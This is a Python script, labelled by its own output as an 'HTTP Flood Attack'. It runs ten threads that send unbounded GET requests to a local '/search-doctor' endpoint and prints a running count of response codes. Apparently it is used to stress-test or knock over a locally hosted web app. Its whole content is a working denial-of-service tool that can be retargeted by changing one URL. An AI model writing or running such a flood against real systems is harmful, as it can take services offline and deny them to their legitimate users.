import threading
import requests
import time
from collections import Counter


target_url = "http://127.0.0.1:5000/search-doctor"
thread_count = 10  


status_counter = Counter()
lock = threading.Lock()


def attack():
    while True:
        try:
            response = requests.get(target_url)
            with lock:
                status_counter[response.status_code] += 1
            print(f"[{time.strftime('%H:%M:%S')}] Status: {response.status_code}")
        except Exception as e:
            with lock:
                status_counter["error"] += 1
            print(f"[!] Error: {e}")


def monitor():
    while True:
        time.sleep(5)  
        with lock:
            total = sum(status_counter.values())
            print("\n===== Status Summary ({} requests) =====".format(total))
            for code, count in status_counter.items():
                print(f"{code}: {count}")
            print("====================================\n")


print(f"Launching HTTP Flood Attack on {target_url} with {thread_count} threads...")
for i in range(thread_count):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()
    
monitor()   
